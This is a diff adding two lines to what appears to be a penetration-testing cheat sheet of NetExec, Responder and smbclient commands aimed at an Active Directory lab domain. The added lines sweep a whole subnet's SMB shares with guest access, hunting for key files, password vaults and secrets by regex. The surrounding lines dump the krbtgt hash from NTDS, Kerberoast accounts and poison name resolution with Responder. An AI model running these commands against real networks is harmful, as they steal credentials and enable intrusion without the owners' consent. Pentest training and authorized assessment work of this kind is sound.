@@ -31,6 +31,8 @@ nxc ldap dc01.inlanefreight.local -u guest -p '' -d inlanefreight.local --bloodh
 nxc smb `IP` --shares -u guest -p '' --spider share --content --regex 'passw'
 nxc smb `IP` -u guest -p '' --ntds  --user krbtgt
 nxc ldap `IP` -u guest -p '' --kerberoasting tickets.txt
+nxc smb 192.168.0.0/24 -u 'guest' -p '' --spider share --regex 'txt|log|conf|back|bak|bkp|old|pdf|ps1|bat|doc|kdbx|pem|key|cer|crt|p12|pfx|zip|7z|rar|tar|cfg|ini|env|xml|json|yml|yaml|sh'
+nxc smb 192.168.0.0/24 -u 'guest' -p '' --shares --spider sambashare --content --regex '(?i)(user(name)?|pass(word)?|pwd|secret|token|api[-_]?key|access[-_]?key|auth|cred)\s*[:=]\s*.+|-----BEGIN .*?PRIVATE KEY-----|[A-Za-z0-9_\-]{20,}'
 sudo responder -I eth0 -rv
 smbclient -L //$(IP) -U 'username%password'
 smbclient -L //$(IP) -U 'username' -p 'password'
